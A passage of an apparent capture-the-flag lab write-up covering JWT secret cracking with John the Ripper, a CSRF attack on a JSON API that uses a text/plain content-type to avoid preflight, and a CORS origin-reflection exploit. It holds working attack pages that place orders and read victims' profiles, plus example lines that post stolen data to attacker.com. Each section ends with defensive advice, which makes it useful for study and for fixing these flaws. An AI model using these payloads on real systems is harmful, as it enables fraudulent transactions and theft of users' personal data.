Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
pyramid          (?)
1g 0:00:00:00 DONE 2/3 (2024-12-08 15:23) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..yellow
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Cracked secret**: `pyramid`

### Step 6: Recalculate Signature with Burp

1. Open Burp Suite and intercept the request to `/api/account`
2. Send the request to Repeater
3. Go to the "JSON Web Tokens" tab
4. Modify the user ID in the payload (e.g., change Alice's ID to admin's ID)
5. Select "Recalculate Signature"
6. Enter the cracked secret: `pyramid`
7. Send the modified request

**Modified JWT** (with valid signature):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiIsImlhdCI6MTY0MjU1NjY3OH0.NEW_SIGNATURE_CALCULATED_WITH_PYRAMID
```

### Step 7: Use Forged Token

Replace the JWT cookie in your browser with the forged token:

1. Open Firefox Developer Tools
2. Navigate to Storage → Cookies
3. Replace the JWT cookie value with the forged token
4. Refresh the page → Admin access granted!

---

## Answer

| Field          | Value                                  |
| -------------- | -------------------------------------- |
| Attack Type    | JWT Secret Brute-force                 |
| Tool Used      | John the Ripper                        |
| Cracked Secret | `pyramid`                              |
| Signature Tool | Burp Suite Repeater with JWT extension |

---

## Why This Works

1. **Weak Secret**: Short or common secrets are in wordlists
2. **HMAC Offline Attack**: HMAC can be brute-forced offline (no rate limiting)
3. **No Secret Rotation**: Same secret used for long periods
4. **Predictable Secrets**: Developers use simple secrets in production

**Defense**:

- Use long, random secrets (minimum 256 bits for HS256)
- Generate secrets: `openssl rand -base64 32`
- Use asymmetric algorithms (RS256) when possible
- Rotate secrets regularly
- Implement rate limiting even though it's offline
- Monitor for unusual token patterns

---

# 8. CSRF with JSON – Content-Type Bypass

## Challenge Overview

**Goal**: Perform Cross-Site Request Forgery attacks against JSON APIs by bypassing CORS preflight checks.

---

## Vulnerability

| Vulnerability             | Description                                       |
| ------------------------- | ------------------------------------------------- |
| **CORS Misconfiguration** | Server accepts `text/plain` content-type for JSON |
| **No CSRF Protection**    | Missing CSRF tokens on state-changing operations  |

---

## What is CSRF with JSON?

Traditional CSRF uses HTML forms, but doesn't work for JSON APIs because:

- `Content-Type: application/json` triggers CORS preflight
- Preflight can be blocked by proper CORS configuration

**The Bypass**:

- Use `Content-Type: text/plain` (doesn't trigger preflight)
- Server still parses body as JSON
- CSRF attack succeeds!

---

## Attack Chain

### Step 1: Identify JSON API Endpoint

Find state-changing operations:

```javascript
POST /api/account/update
Content-Type: application/json

{"email": "newemail@example.com"}
```

### Step 2: Test Content-Type Flexibility

Try different content types:

```bash
# Original
curl -X POST https://<target>/api/account/update \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'

# Test with text/plain
curl -X POST https://<target>/api/account/update \
  -H "Content-Type: text/plain" \
  -d '{"email":"test@test.com"}'
```

If both work → vulnerable!

### Step 3: Check CORS Preflight

```bash
# text/plain doesn't trigger preflight
curl -X OPTIONS https://<target>/api/account/update \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type"
```

`text/plain` is in the CORS "simple request" list, so no preflight!

### Step 4: Craft CSRF Attack - Ordering 42 Choco Cakes

The attack consists of two steps:

1. Add 42 Choco cakes to the shopping cart
2. Complete the order (payment)

Create `attack.html` in Theia Web IDE:

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF Attack Page</h1>

    <script>
      /* CHANGEME: Use the UUID from your current lab instance */
      const UUID = "6c2d92b4-1454-4e9a-b370-c030104dfe06";

      /* Execute the entire attack */
      attack();

      /* Function attack that calls two other functions to issue the requests */
      async function attack() {
        await add_cakes_to_cart(42);
        await complete_order();
      }

      /* Adds n Choco cakes to the shopping cart */
      async function add_cakes_to_cart(n) {
        const url = "https://" + UUID + ".i.vuln.land/api/add_cart";
        const data = {
          name: "Choco",
          price: 17,
          pid: 1,
        };

        for (i = 0; i < n; ++i) {
          try {
            /* Add one cake to shopping cart */
            const r = await fetch(url, {
              method: "POST",
              credentials: "include",
              headers: { "Content-Type": "text/plain" },
              mode: "no-cors",
              body: JSON.stringify(data),
            });
          } catch (error) {
            console.log(error);
          }
        }
      }

      /* Complete the order */
      async function complete_order() {
        const url = "https://" + UUID + ".i.vuln.land/api/order";
        try {
          await fetch(url, {
            method: "POST",
            credentials: "include",
            headers: { "Content-Type": "text/plain" },
            mode: "no-cors",
            body: JSON.stringify({}),
          });
        } catch (error) {
          console.log(error);
        }
      }
    </script>
  </body>
</html>
```

**Key elements**:

- `Content-Type: text/plain` - Bypasses CORS preflight (no preflight for "simple" content types)
- `credentials: "include"` - Sends victim's authentication cookies
- `mode: 'no-cors'` - Doesn't read response (avoids CORS blocking)
- Loop to add 42 cakes individually to cart
- Complete order with empty POST to `/api/order`

### Step 5: Host Attack Page

The attack page is hosted on Theia Web IDE at:

```
https://theia-698a87e4-69d1-4002-a770-3585da63d33c.i.vuln.land/attack.html
```

### Step 6: Execute Attack

When victim (Alice) visits the attack page while logged in:

1. JavaScript executes automatically on page load
2. Loop runs 42 times, adding one Choco cake each iteration
3. Each request includes Alice's authentication cookies
4. Server accepts requests (thinks they're legitimate)
5. Order is completed with payment
6. Alice's profile now shows: **42 Choco cakes, total CHF 714**

---

## Result

After visiting the attack page, Alice's PROFILE page shows:

- Product: Choco (quantity: 42)
- Total price: CHF 714 (42 × 17)

**Attack successful!**

---

## Answer

| Field            | Value                                                                   |
| ---------------- | ----------------------------------------------------------------------- |
| Attack Type      | CSRF via Content-Type bypass                                            |
| Bypass Technique | Use `text/plain` instead of `application/json`                          |
| Target Endpoints | `/api/add_cart` and `/api/order`                                        |
| Attack Payload   | 42 Choco cakes at CHF 17 each                                           |
| Total Damage     | CHF 714 charged to victim (Alice)                                       |
| Why It Works     | `text/plain` doesn't trigger CORS preflight, server accepts JSON anyway |

---

## Why This Works

1. **CORS Simple Requests**: `text/plain` is allowed without preflight
2. **Flexible Parsing**: Server parses body as JSON regardless of Content-Type
3. **Cookie-based Auth**: Cookies sent automatically with cross-origin requests
4. **No CSRF Tokens**: Server doesn't verify request origin
5. **SameSite Not Set**: Cookies lack `SameSite=Strict/Lax` attribute

**Defense**:

- Implement CSRF tokens for all state-changing operations
- Validate `Content-Type` header server-side
- Use `SameSite=Strict` or `SameSite=Lax` cookie attribute
- Check `Origin` and `Referer` headers
- Don't accept arbitrary content types for JSON endpoints
- Use custom headers (requires preflight)

---

# 9. CORS Misconfiguration

## Challenge Overview

**Goal**: Exploit CORS misconfiguration to steal sensitive data (full user profile) from authenticated users by making cross-origin requests with credentials.

---

## Vulnerability

| Vulnerability             | Description                                                     |
| ------------------------- | --------------------------------------------------------------- |
| **CORS Misconfiguration** | Server reflects any `Origin` header in CORS response            |
| **Credentials Allowed**   | `Access-Control-Allow-Credentials: true` with reflected origin  |
| **No Origin Validation**  | Server doesn't check Origin against whitelist before reflecting |

---

## What is CORS?

### Background: Same-Origin Policy (SOP)

Browsers enforce the **Same-Origin Policy** by default: JavaScript running on one website cannot access data from another website.

**Same origin means all three match:**

- Protocol (http/https)
- Domain (example.com)
- Port (80, 443, 8080, etc.)

**Examples:**

| Page URL                    | Request URL                 | Same Origin?                         |
| --------------------------- | --------------------------- | ------------------------------------ |
| `https://shop.com/page`     | `https://shop.com/api`      | ✅ YES (same protocol, domain, port) |
| `https://shop.com/page`     | `https://api.shop.com/data` | ❌ NO (different subdomain)          |
| `https://shop.com/page`     | `http://shop.com/api`       | ❌ NO (different protocol)           |
| `https://shop.com:443/page` | `https://shop.com:8080/api` | ❌ NO (different port)               |

**Why SOP exists:** Without it, any website could read your Gmail, steal your bank data, etc.

### What is CORS?

**Cross-Origin Resource Sharing (CORS)** is a mechanism that allows servers to **relax** the Same-Origin Policy for specific origins.

**How it works:**

1. Browser sees JavaScript making cross-origin request
2. Browser adds `Origin` header to request automatically
3. Server responds with CORS headers indicating if origin is allowed
4. Browser checks if response headers allow the origin
5. If allowed: JavaScript can read response
6. If not allowed: Browser blocks JavaScript from reading response

**CORS is controlled entirely by HTTP response headers from the server.**

---

## CORS Headers Reference

### 1. `Access-Control-Allow-Origin`

**Purpose:** Specifies which origin(s) can read the response.

**Syntax:**

```http
Access-Control-Allow-Origin: <origin>
Access-Control-Allow-Origin: *
```

**Examples:**

```http
# Allow specific origin
Access-Control-Allow-Origin: https://trusted-frontend.com

# Allow any origin (wildcard) - can't be used with credentials!
Access-Control-Allow-Origin: *
```

**How it works:**

- Browser sends: `Origin: https://attacker.com`
- Server responds: `Access-Control-Allow-Origin: https://trusted-frontend.com`
- Browser checks: `attacker.com ≠ trusted-frontend.com` → **Blocks access**

**Security:**

- ✅ **Secure:** Whitelist specific trusted origins
- ❌ **Insecure:** Reflect any origin without validation
- ❌ **Insecure:** Use wildcard `*` with sensitive data

---

### 2. `Access-Control-Allow-Credentials`

**Purpose:** Controls whether cookies and authentication can be used with cross-origin requests.

**Syntax:**

```http
Access-Control-Allow-Credentials: true
```

**When is this header needed?**

This header is **ONLY required when:**

1. JavaScript uses `credentials: 'include'` in fetch/XHR
2. You want to send cookies with the request
3. You want JavaScript to read authenticated responses

**Important rules:**

- Cannot be used with `Access-Control-Allow-Origin: *` (wildcard)
- Must specify exact origin when using credentials
- Only affects cross-origin requests (same-origin always includes credentials)

---

## CORS Scenarios: Complete Examples

### Scenario A: Reading Public API (No Authentication Needed)

```javascript
// No credentials needed - just reading public data
fetch("https://api.example.com/public-data")
  .then((response) => response.json())
  .then((data) => console.log(data)); // ✅ Can read if CORS allows origin
```

**Server only needs:**

```
Access-Control-Allow-Origin: https://attacker.com
// NO credentials header needed - no cookies involved
```

**Result:** JavaScript CAN read the response (but request is unauthenticated, so only gets public data)

### Scenario B: Reading Private API (Authentication with Cookies)

```javascript
// Credentials needed - trying to access user's private data
fetch("https://api.example.com/my-private-profile", {
  credentials: "include", // ← This sends cookies!
})
  .then((response) => response.json())
  .then((data) => console.log(data)); // ✅ Only works if credentials allowed
```

**Server needs BOTH:**

```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true  // ← Required for cookies!
```

**Result:** JavaScript CAN read the response AND request is authenticated (cookies sent)

---

### Complete Examples with All Scenarios

**Example 1: No CORS headers at all**

```javascript
fetch("https://api.com/data")
  .then((response) => response.json())
  .then((data) => console.log(data)); // ❌ ERROR: CORS blocked
```

Server response:

```
HTTP/1.1 200 OK
Content-Type: application/json
// Missing: Access-Control-Allow-Origin header
```

**Result:** ❌ Browser blocks JavaScript from reading response

- You'll see: `CORS policy: No 'Access-Control-Allow-Origin' header`

---

**Example 2: CORS allows origin, NO credentials (PUBLIC API)**

```javascript
// No credentials - just reading public data
fetch("https://api.com/public-weather")
  .then((response) => response.json())
  .then((data) => console.log(data)); // ✅ SUCCESS: Can read public data
```

Server response:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Content-Type: application/json

{"temperature": 20, "condition": "sunny"}
```

**Result:** ✅ JavaScript CAN read the response

- No cookies sent (no authentication)
- Only public data returned
- **NO `Access-Control-Allow-Credentials` needed!**

---

**Example 3: CORS allows origin, but you TRY to use credentials without permission**

```javascript
// Trying to send cookies but server doesn't allow it
fetch("https://api.com/private-profile", {
  credentials: "include", // ← Trying to send cookies
})
  .then((response) => response.json())
  .then((data) => console.log(data)); // ❌ ERROR: Credentials not allowed
```

Server response:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
// Missing: Access-Control-Allow-Credentials: true
```

**Result:** ❌ Browser blocks it

- You used `credentials: 'include'` but server didn't allow credentials
- Cookies are NOT sent
- Response is NOT readable by JavaScript
- Error: `Credentials flag is 'true', but Access-Control-Allow-Credentials is not`

---

**Example 4: CORS allows origin WITH credentials (VULNERABLE!) - Our Attack**

```javascript
// This is the attack - trying to read Alice's private data
fetch("https://vulnerable-shop.com/api/account", {
  credentials: "include", // ← Send Alice's cookies
})
  .then((response) => response.json())
  .then((data) => console.log(data)); // ✅ SUCCESS: Can read everything!
```

Server response:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com  ← Reflected!
Access-Control-Allow-Credentials: true  ← Allows cookies + reading!
Content-Type: application/json

{
  "username": "alice",
  "email": "alice@example.com",
  "address": "123 Main St",
  "creditCard": "4111-1111-1111-1111",
  "orders": [...]
}
```

**Result:** ✅ JavaScript CAN read EVERYTHING

- Cookies ARE sent (authenticated as Alice!)
- Response body IS fully readable
- JavaScript can access ALL of Alice's private data
- This is the CORS vulnerability!

**What exactly can JS read when allowed?**

```javascript
.then(response => {
    response.status        // ✅ Can read: 200
    response.headers       // ✅ Can read: Content-Type, etc.
    response.json()        // ✅ Can read: Entire response body
    response.text()        // ✅ Can read: Raw text
})
.then(data => {
    data.username          // ✅ Can read: "alice"
    data.email             // ✅ Can read: "alice@example.com"
    data.creditCard        // ✅ Can read: "4111-1111-1111-1111"
    // Send to attacker:
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)  // ✅ Complete data theft!
    })
})
```

---

---

## CORS Decision Matrix

### When Can JavaScript Read Cross-Origin Responses?

| JavaScript Code                                           | Server Headers                                                                                   | Cookies Sent? | Can Read Response? | Use Case                                               |
| --------------------------------------------------------- | ------------------------------------------------------------------------------------------------ | ------------- | ------------------ | ------------------------------------------------------ |
| `fetch('https://api.com/data')`                           | None                                                                                             | ❌ No         | ❌ No              | **Blocked** - No CORS headers                          |
| `fetch('https://api.com/data')`                           | `Access-Control-Allow-Origin: https://requester.com`                                             | ❌ No         | ✅ Yes             | **Public API** - No auth needed                        |
| `fetch('https://api.com/data')`                           | `Access-Control-Allow-Origin: *`                                                                 | ❌ No         | ✅ Yes             | **Public API** - Open to all                           |
| `fetch('https://api.com/data', {credentials: 'include'})` | `Access-Control-Allow-Origin: https://requester.com`                                             | ❌ No         | ❌ No              | **Blocked** - Missing credentials header               |
| `fetch('https://api.com/data', {credentials: 'include'})` | `Access-Control-Allow-Origin: https://requester.com`<br>`Access-Control-Allow-Credentials: true` | ✅ Yes        | ✅ Yes             | **Authenticated API** - Full access                    |
| `fetch('https://api.com/data', {credentials: 'include'})` | `Access-Control-Allow-Origin: *`<br>`Access-Control-Allow-Credentials: true`                     | ❌ No         | ❌ No              | **Invalid** - Browser blocks wildcard with credentials |

### Summary

**Q: When do I need `Access-Control-Allow-Credentials: true`?**
**A:** Only when your JavaScript uses `credentials: 'include'` (to send cookies).

**Q: Can I read responses without credentials header?**
**A:** Yes! If you don't need authentication, just `Access-Control-Allow-Origin` is enough.

**Q: What's the difference?**

- **Without credentials:** Read unauthenticated (public) data
- **With credentials:** Read authenticated (private) data using user's cookies

**In this challenge:**
We need credentials because we're stealing **Alice's private profile data**, which requires her authentication cookies!

---

## The Vulnerability: Origin Reflection

### Secure Configuration (Proper Implementation)

**Server-side code (secure):**

```python
# Python/Flask example
ALLOWED_ORIGINS = [
    'https://trusted-frontend.com',
    'https://mobile-app.com'
]

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')

    if origin in ALLOWED_ORIGINS:  # ← Validates against whitelist!
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'

    return response
```

**Request/Response flow:**

```http
Request from attacker.com:
GET /api/account HTTP/1.1
Origin: https://attacker.com
Cookie: session=alice_token

↓

Server checks: attacker.com NOT in ['trusted-frontend.com', 'mobile-app.com']
Server does NOT set CORS headers

↓

Response:
HTTP/1.1 200 OK
Content-Type: application/json
(No Access-Control-Allow-Origin header)

{"user": "alice", "email": "alice@example.com"}

↓

Browser: Origin not allowed → Blocks JavaScript from reading response
Attack fails! ✅
```

---

### Insecure Configuration (Vulnerable Implementation)

**Server-side code (vulnerable):**

```python
# Python/Flask example - VULNERABLE!
@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')

    # ❌ VULNERABILITY: Reflects any origin without validation!
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'

    return response
```

**Request/Response flow:**

```http
Request from attacker.com:
GET /api/account HTTP/1.1
Origin: https://attacker.com
Cookie: session=alice_token

↓

Server blindly reflects: Access-Control-Allow-Origin = 'https://attacker.com'
(No validation performed!)

↓

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com  ← Reflected!
Access-Control-Allow-Credentials: true  ← Allows cookies!
Content-Type: application/json

{"user": "alice", "email": "alice@example.com", "address": "123 Main St"}

↓

Browser: Origin matches → Allows JavaScript to read response
Attack succeeds! ❌
```

### Why ANY Random Origin Works

The vulnerability is that the server **doesn't validate** the Origin header. It just:

1. Reads the Origin header from the request
2. Copies it to Access-Control-Allow-Origin in the response

**Test with random nonsense**:

```bash
curl -H "Origin: https://i-wonder-what-happens"
# Server responds: Access-Control-Allow-Origin: https://i-wonder-what-happens
```

```bash
curl -H "Origin: https://totally-made-up-by-attacker.com"
# Server responds: Access-Control-Allow-Origin: https://totally-made-up-by-attacker.com
```

```bash
curl -H "Origin: https://evil.com"
# Server responds: Access-Control-Allow-Origin: https://evil.com
```

The server accepts **ANY** origin! This is the bug. It should only accept a whitelist of trusted origins.

### Attack Flow Diagram

```
Victim (Alice) visits attacker.com while logged in to vulnerable-shop.com
    ↓
Attacker's JavaScript runs:
    fetch('https://vulnerable-shop.com/api/account', {
        credentials: 'include',  ← Send Alice's cookies
        headers: {'Origin': 'https://attacker.com'}
    })
    ↓
Browser sends request:
    GET /api/account
    Origin: https://attacker.com
    Cookie: session=alice_token  ← Alice's authentication!
    ↓
Server (vulnerable) responds:
    Access-Control-Allow-Origin: https://attacker.com  ← Reflects attacker!
    Access-Control-Allow-Credentials: true  ← Allows cookies + reading!

    {user: "alice", email: "alice@example.com", address: "123 Main St"}
    ↓
Browser checks:
    ✓ Origin matches (attacker.com == attacker.com)
    ✓ Credentials allowed (true)
    → Allows JavaScript to read response!
    ↓
Attacker gets Alice's data:
    .then(data => {
        sendToAttacker(data);  // Alice's profile stolen!
    })
```

**If server had proper validation**:

```
Server (secure) responds:
    Access-Control-Allow-Origin: https://trusted-shop-frontend.com  ← Fixed whitelist!
    Access-Control-Allow-Credentials: true
    ↓
Browser checks:
    ✗ Origin mismatch (attacker.com ≠ trusted-shop-frontend.com)
    → Blocks JavaScript from reading response!
    ↓
Attack fails ✓
```

---

## Attack Chain

### TL;DR - The Two Key Points

**1. `Access-Control-Allow-Credentials: true` = "Send cookies + allow reading"**

- Without it: JavaScript can't read responses (even if origin is allowed)
- With it: JavaScript CAN read responses AND cookies are sent

**2. Random Origin Works = Server doesn't validate**

- We can use ANY origin (`https://i-wonder-what-happens`, `https://evil.com`, anything!)
- Server blindly reflects it back instead of checking against a whitelist
- This is the vulnerability: server should ONLY allow specific trusted origins

**3. Why do we even send an Origin header?**

- **The browser automatically adds it** - we don't choose to!
- When JavaScript makes a cross-origin request, the browser adds `Origin: <current-page-domain>`
- Example: JavaScript on `attacker.com` → browser adds `Origin: https://attacker.com`
- The server then reflects this back, and the browser checks if they match
- In testing (curl), we manually add random origins to PROVE the server reflects anything

---

### Step 1: Identify CORS Configuration

Login as Alice and access the PROFILE page. Use Burp to monitor the request to `/api/account`.

Test CORS by adding an `Origin` header. We can use **any random domain** to test:

```bash
# Using a random, nonsense origin to test if server validates
curl -H "Origin: https://i-wonder-what-happens" \
     -H "Cookie: session=abc123" \
     https://<target>/api/account -v
```

Check response headers:

```
Access-Control-Allow-Origin: https://i-wonder-what-happens  ← Server reflected our random origin!
Access-Control-Allow-Credentials: true  ← Allows cookies + reading responses
```

**Critical finding**: The server reflects ANY origin we send!

**What this means**:

- We sent a completely made-up origin: `https://i-wonder-what-happens`
- Server didn't check if it's trusted
- Server just copied it to the response headers
- This tells the browser: "Yes, allow `i-wonder-what-happens` to read responses with cookies"

**Proper behavior would be**:

```
# Secure server checks against whitelist
if origin NOT in ['https://trusted-frontend.com', 'https://trusted-mobile.com']:
    DON'T set Access-Control-Allow-Origin

# Our random origin would be rejected
```

### Step 2: Identify Target Endpoint

The vulnerable endpoint is:

- `/api/account` - Returns complete user profile (address, email, orders, etc.)

### Step 3: Create Exploit Page - Steal Alice's Profile

Create `attack.html` in Theia Web IDE:

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF Attack Page</h1>

    <script>
      /* CHANGEME: Use the UUID from your current lab instance */
      const UUID = "55dd6bab-2c2a-43d1-ac87-335d1fd73288";

      /* Execute the entire attack */
      attack();

      /* Function attack that fetches user profile data */
      async function attack() {
        const url = "https://" + UUID + ".i.vuln.land/api/account";
        try {
          await fetch(url, {
            method: "GET",
            credentials: "include",
            headers: { Origin: "https://i-wonder-what-happens" },
          })
            .then((response) => response.json())
            .then((data) => {
              // Display stolen profile in alert
              alert(JSON.stringify(data, null, 2));
            });
        } catch (error) {
          console.log(error);
        }
      }
    </script>
  </body>
</html>
```

**Key elements**:

- `credentials: "include"` - Sends victim's authentication cookies
- `Origin` header - Server reflects this and allows cross-origin access
- `alert(JSON.stringify(data, null, 2))` - Displays stolen profile data in popup
- In real attack: Data would be sent to attacker server instead of displayed

### Step 4: Host Attack Page

The attack page is hosted on Theia Web IDE at:

```
https://theia-73904be1-b4d7-44d9-8c22-eb0a07a85f34.i.vuln.land/attack.html
```

### Step 5: Execute Attack

When victim (Alice) visits the attack page while logged in:

1. JavaScript executes automatically on page load
2. `fetch()` makes GET request to `/api/account` with Alice's cookies
3. Server sees `Origin` header and reflects it in `Access-Control-Allow-Origin`
4. Server also sets `Access-Control-Allow-Credentials: true`
5. Browser allows JavaScript to read the response (CORS misconfiguration!)
6. Profile data is displayed in alert popup

**Stolen data includes**:

- Username
- Email address
- Full name
- Shipping address
- Order history
- Account settings

### Step 6: What a Real Attack Would Do

In a real attack, instead of displaying the data with `alert()`, the attacker would exfiltrate it:

````javascript
.then(data => {
    // Send to attacker server
    fetch("https://attacker.com/collect", {
        method: "POST",
        body: JSON.stringify(data)
    });
});
````

---

## Common CORS Misconfigurations

| Misconfiguration          | Risk                                    |
| ------------------------- | --------------------------------------- |
| Reflecting any Origin     | Any site can read responses             |
| `Origin: null` allowed    | Bypassed with sandboxed iframe          |
| Wildcard with credentials | Any domain (but browsers block this)    |
| Subdomain-only validation | Attacker uses subdomain takeover        |
| Regex bypass              | `evil-trusted-site.com` matches pattern |

---

## Answer

| Field         | Value                                            |
| ------------- | ------------------------------------------------ |
| Vulnerability | CORS reflects arbitrary origins with credentials |
| Attack Vector | Cross-origin fetch to `/api/account` with `credentials: 'include'` |
| Target Endpoint | `/api/account` (returns full user profile)     |
| Demo Method   | `alert(JSON.stringify(data, null, 2))` displays stolen data |
| Impact        | Complete profile theft (email, address, orders, settings) |

---

## Why This Works

1. **Origin Reflection**: Server doesn't validate Origin, just reflects it
2. **Credentials Allowed**: `Access-Control-Allow-Credentials: true` allows cookie-based requests
3. **Browser Enforcement**: Browser blocks by default, but CORS headers override
4. **No Origin Whitelist**: Server should only allow specific trusted origins

---

## Security Best Practices & Defense

### ✅ Secure CORS Implementation

**1. Maintain explicit origin whitelist:**
```python
# Python/Flask example
ALLOWED_ORIGINS = [
    'https://trusted-frontend.com',
    'https://mobile-app.com'
]

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')

    if origin in ALLOWED_ORIGINS:  # Exact match!
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'

    return response
````

**2. Validate before reflecting:**

- ✅ Check against explicit whitelist
- ❌ Don't use substring/regex matching (bypassable)
- ❌ Don't reflect without validation

**3. Use credentials header sparingly:**

- Only enable for endpoints that actually need authentication
- Always combine with specific origin (never `*`)
- Indicates sensitive data - validate carefully

**4. Implement defense in depth:**

- **CSRF tokens** - Validate request origin
- **SameSite cookies** - `SameSite=Strict` or `Lax`
- **Server-side authorization** - Always verify permissions
- **Rate limiting** - Slow down automated attacks

### ❌ Common Mistakes to Avoid

| Mistake                       | Example                                                                       | Why It's Bad                                           |
| ----------------------------- | ----------------------------------------------------------------------------- | ------------------------------------------------------ |
| **Blind reflection**          | `response.headers['Access-Control-Allow-Origin'] = request.headers['Origin']` | Any attacker can access with credentials               |
| **Wildcard with credentials** | `Access-Control-Allow-Origin: *`<br>`Access-Control-Allow-Credentials: true`  | Invalid - browsers block anyway                        |
| **Subdomain matching**        | `if origin.endswith('.example.com'): allow()`                                 | Vulnerable to subdomain takeover                       |
| **Null origin**               | `if origin == 'null': allow()`                                                | Can be forged with sandboxed iframe                    |
| **Regex bypass**              | `if re.match(r'.*example\.com', origin): allow()`                             | Matches `evil-example.com`, `example.com.attacker.com` |

### Defense Layers

| Layer             | Mechanism          | Protection                 |
| ----------------- | ------------------ | -------------------------- |
| **CORS**          | Origin whitelist   | Browser-based data theft   |
| **CSRF**          | Tokens             | Cross-site request forgery |
| **Cookies**       | SameSite attribute | Cross-site cookie sending  |
| **Authorization** | Server-side checks | Unauthorized access        |
| **Rate Limiting** | Request throttling | Automated attacks          |

**Important:** CORS is browser-enforced only. It doesn't protect against:

- Direct API calls (curl, scripts, Postman)
- Server-side requests
- Mobile apps
- Browser extensions

Always implement proper authentication and authorization on the server!
